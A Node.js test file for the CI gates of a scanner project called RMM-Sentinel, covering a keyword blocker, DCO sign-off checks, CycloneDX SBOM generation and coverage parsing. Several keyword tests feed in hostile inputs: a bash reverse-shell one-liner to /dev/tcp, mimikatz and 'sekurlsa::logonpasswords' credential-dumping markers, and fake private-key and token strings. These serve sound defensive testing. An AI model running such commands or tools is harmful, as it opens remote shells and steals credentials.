// test-gates.mjs — offline tests for the RMM-Sentinel CI gates (node:test).
// Run: node --test ci/test-gates.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import { scanFile, scanTree } from "./check-keywords.mjs";
import { checkCommit } from "./check-dco.mjs";
import { buildBom, validateBom, productionFiles as sbomFiles } from "./sbom.mjs";
import { parseCoverageReport, coverageTargets } from "./coverage.mjs";

const ciDir = dirname(fileURLToPath(import.meta.url));
const repoRoot = join(ciDir, "..");

test("clean production mjs file yields no findings", () => {
  const out = scanFile("src/scan.mjs", "import { x } from './parse.mjs';\nexport function run() {}\n");
  assert.deepEqual(out, []);
});

test("child_process in production outside the runner is blocked", () => {
  const out = scanFile("src/scan.mjs", 'import { exec } from "node:child_process";\nexport const c = exec;\n');
  assert.equal(out.length, 1);
  assert.equal(out[0].rule, "SCOPE-EXEC-001");
});

test("child_process in src/runner.mjs is allowed (the sanctioned module)", () => {
  const out = scanFile("src/runner.mjs", 'import { spawnSync } from "node:child_process";\nexport const PROBES = {};\n');
  assert.deepEqual(out, []);
});

test("child_process in tests and ci scripts is allowed", () => {
  assert.deepEqual(scanFile("test/test-scan.mjs", 'import { spawnSync } from "node:child_process";\n'), []);
  assert.deepEqual(scanFile("ci/check-dco.mjs", 'import { execFileSync } from "node:child_process";\n'), []);
});

test("mutating command verbs are blocked inside src/runner.mjs", () => {
  const out = scanFile("src/runner.mjs", 'argv: ["taskkill", "/f", "/im", "x.exe"],\n');
  assert.equal(out[0]?.rule, "SCOPE-EXEC-002");
});

test("read-only probe commands inside src/runner.mjs are allowed", () => {
  const out = scanFile("src/runner.mjs", 'argv: ["schtasks.exe", "/query", "/fo", "csv", "/nh"],\n');
  assert.deepEqual(out, []);
});

test("network clients are blocked in production code", () => {
  const out = scanFile("rmm-sentinel.mjs", 'import http from "node:http";\nhttp.get("https://x");\n');
  assert.equal(out[0]?.rule, "SCOPE-NET-001");
});

test("fetch-style network use is blocked in production code", () => {
  const out = scanFile("src/scan.mjs", "const r = fetch(url);\n");
  assert.equal(out[0]?.rule, "SCOPE-NET-001");
});

test("filesystem writes outside src/report.mjs are blocked", () => {
  const out = scanFile("src/catalog.mjs", 'writeFileSync(p, data, "utf8");\n');
  assert.equal(out[0]?.rule, "SCOPE-WRITE-001");
});

test("filesystem writes in src/report.mjs are allowed (behind --out)", () => {
  const out = scanFile("src/report.mjs", 'import { writeFileSync, mkdirSync } from "node:fs";\nexport function writeIfOut(c, p) {}\n');
  assert.deepEqual(out, []);
});

test("eval-style dynamic code loading is blocked in production", () => {
  const out = scanFile("src/scan.mjs", "const m = await import(userPath);\n");
  assert.equal(out[0]?.rule, "SCOPE-EVAL-001");
});

test("reverse shell one-liner is blocked in any file type", () => {
  const marker = "bash -i >& /dev/tcp/10.0.0.1/443 2>&1";
  const out = scanFile("notes.md", marker);
  assert.equal(out[0]?.rule, "OFFENSE-REVSHELL-001");
});

test("credential-dumping tooling markers are blocked in prose files", () => {
  const out = scanFile("docs/x.md", "run mimikatz to dump");
  assert.equal(out[0]?.rule, "OFFENSE-STAGER-001");
});

test("private key material is blocked", () => {
  const key = "-----BEGIN RSA PRIVATE KEY-----\nMIIE\n-----END RSA PRIVATE KEY-----";
  assert.equal(scanFile("docs/key.md", key)[0]?.rule, "SCOPE-SECRETS-001");
});

test("fake tokens are blocked", () => {
  assert.equal(scanFile("a.md", "token hf_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789")[0]?.rule, "SCOPE-SECRETS-001");
});

test("rule context (catalog data, fixtures) is exempt from content rules", () => {
  const out = scanFile("data/rmm-catalog.json", '{"processes": ["mimikatz", "sekurlsa::logonpasswords"]}');
  assert.deepEqual(out, []);
  assert.deepEqual(scanFile("test/fixtures/sig.json", '{"p": "webinject beacon_interval: 60"}'), []);
});

test("secrets still apply inside rule context", () => {
  assert.equal(
    scanFile("data/rmm-catalog.json", '{"x": "-----BEGIN RSA PRIVATE KEY-----"}')[0]?.rule,
    "SCOPE-SECRETS-001",
  );
});

test("the repository passes its own keyword gate", () => {
  const findings = scanTree(repoRoot);
  assert.deepEqual(findings, [], JSON.stringify(findings, null, 2));
});

test("keyword gate CLI exits 0 on the repository", () => {
  const out = execFileSync(
    process.execPath,
    [join(ciDir, "check-keywords.mjs"), "--root", repoRoot],
    { encoding: "utf8" },
  );
  assert.match(out, /clean/);
});

test("keyword gate CLI exits 1 on a finding", () => {
  const dir = mkdtempSync(join(tmpdir(), "rs-gate-"));
  try {
    writeFileSync(join(dir, "bad.md"), "bash -i >& /dev/tcp/10.0.0.1/443 2>&1\n");
    let code = 0;
    let out = "";
    try {
      out = execFileSync(process.execPath, [join(ciDir, "check-keywords.mjs"), "--root", dir], {
        encoding: "utf8",
      });
    } catch (err) {
      code = err.status;
      out = `${err.stdout ?? ""}${err.stderr ?? ""}`;
    }
    assert.equal(code, 1, out);
    assert.match(out, /OFFENSE-REVSHELL-001/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("dco accepts a matching sign-off", () => {
  const res = checkCommit("feat: x", "Signed-off-by: trung-dev <trung-dev@users.noreply.github.com>", "trung-dev@users.noreply.github.com");
  assert.equal(res.ok, true);
});

test("dco rejects a missing sign-off", () => {
  const res = checkCommit("feat: x", "", "trung-dev@users.noreply.github.com");
  assert.equal(res.ok, false);
  assert.match(res.reason, /missing/);
});

test("dco rejects a mismatched sign-off", () => {
  const res = checkCommit("feat: x", "Signed-off-by: Other <other@example.com>", "trung-dev@users.noreply.github.com");
  assert.equal(res.ok, false);
  assert.match(res.reason, /does not match/);
});

test("sbom builds a valid CycloneDX 1.6 document with hashed file components", () => {
  const files = [
    { path: "data/rmm-catalog.json", sha256: "a".repeat(64) },
    { path: "rmm-sentinel.mjs", sha256: "b".repeat(64) },
    { path: "src/parse.mjs", sha256: "c".repeat(64) },
  ];
  const bom = buildBom(files, {
    serial: "11111111-2222-3333-4444-555555555555",
    timestamp: "2026-11-12T12:00:00Z",
    toolVersion: "0.1.0",
  });
  assert.deepEqual(validateBom(bom), []);
  assert.equal(bom.bomFormat, "CycloneDX");
  assert.equal(bom.specVersion, "1.6");
  assert.equal(bom.metadata.component.type, "application");
  assert.equal(bom.metadata.component.name, "rmm-sentinel");
  assert.ok(bom.components.every((c) => c.type === "file"));
  const cat = bom.components.find((c) => c.name === "data/rmm-catalog.json");
  assert.equal(cat.hashes[0].alg, "SHA-256");
  assert.equal(cat.hashes[0].content, "a".repeat(64));
});

test("sbom validation rejects bad documents", () => {
  assert.ok(validateBom({ bomFormat: "SPDX", specVersion: "1.6", components: [] }).length >= 2);
  assert.ok(validateBom({ bomFormat: "CycloneDX", specVersion: "1.6", components: [{ type: "nope" }] }).length >= 1);
  assert.ok(
    validateBom({
      bomFormat: "CycloneDX",
      specVersion: "1.6",
      components: [{ type: "file", name: "x", "bom-ref": "file:x", hashes: [{ alg: "MD5", content: "zz" }] }],
    }).length >= 1,
    "file components without a real SHA-256 must be rejected",
  );
});

test("sbom CLI writes a parseable, deterministic document", () => {
  const dir = mkdtempSync(join(tmpdir(), "rs-sbom-"));
  const out1 = join(dir, "sbom1.cdx.json");
  const out2 = join(dir, "sbom2.cdx.json");
  try {
    for (const out of [out1, out2]) {
      execFileSync(
        process.execPath,
        [join(ciDir, "sbom.mjs"), "--out", out, "--timestamp", "2026-11-12T12:00:00Z", "--tool-version", "0.1.0"],
        { encoding: "utf8" },
      );
    }
    const text1 = readFileSync(out1, "utf8");
    const text2 = readFileSync(out2, "utf8");
    assert.equal(text1, text2, "same inputs must produce byte-identical SBOMs");
    const bom = JSON.parse(text1);
    assert.deepEqual(validateBom(bom), []);
    assert.ok(bom.components.some((c) => c.name === "rmm-sentinel.mjs"));
    assert.ok(bom.components.some((c) => c.name === "src/runner.mjs"));
    assert.ok(bom.components.some((c) => c.name === "data/rmm-catalog.json"));
    assert.match(bom.serialNumber, /^urn:uuid:[0-9a-f-]{36}$/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("productionFiles lists the shipped product surface deterministically", () => {
  const files = sbomFiles().map((f) => f.path);
  assert.deepEqual(files, [...files].sort());
  for (const f of ["data/rmm-catalog.json", "rmm-sentinel.mjs", "src/catalog.mjs", "src/runner.mjs", "src/version.mjs"]) {
    assert.ok(files.includes(f), `missing production file: ${f}`);
  }
  for (const rec of sbomFiles()) {
    assert.match(rec.sha256, /^[0-9a-f]{64}$/, `${rec.path} must carry a real SHA-256`);
  }
});

const COV_REPORT = [
  "ℹ start of coverage report",
  "ℹ -----------------------------------------------------------------------------------------------------",
  "ℹ file              | line % | branch % | funcs % | uncovered lines",
  "ℹ -----------------------------------------------------------------------------------------------------",
  "ℹ rmm-sentinel.mjs  |  92.00 |    80.00 |  100.00 | 240-241",
  "ℹ src               |        |          |         | ",
  "ℹ  catalog.mjs      |  88.24 |    77.27 |  100.00 | 46-47",
  "ℹ  runner.mjs       | 100.00 |  100.00 |  100.00 | ",
  "ℹ -----------------------------------------------------------------------------------------------------",
  "ℹ all files         |  93.75 |    85.22 |   92.75 | ",
  "ℹ -----------------------------------------------------------------------------------------------------",
  "ℹ end of coverage report",
].join("\n");

test("parseCoverageReport reads the verified table format", () => {
  const parsed = parseCoverageReport(COV_REPORT, ["rmm-sentinel.mjs", "src/catalog.mjs", "src/runner.mjs", "src/missing.mjs"]);
  assert.ok(parsed, "the verified format must parse");
  assert.equal(parsed.linePct, 93.75);
  assert.deepEqual(parsed.missingFiles, ["src/missing.mjs"]);
});

test("parseCoverageReport fails closed on unparseable reports", () => {
  assert.equal(parseCoverageReport("no table here", []), null);
  assert.equal(parseCoverageReport("all files |  |  |  | ", []), null, "empty percentage cell is a parse failure");
  assert.equal(parseCoverageReport("", []), null);
});

test("coverage gate accounts for the real production files", () => {
  const files = coverageTargets();
  const parsed = parseCoverageReport(COV_REPORT, files);
  assert.ok(parsed);
  // this fixture only contains two of the real production files
  assert.ok(parsed.missingFiles.length >= 3);
});
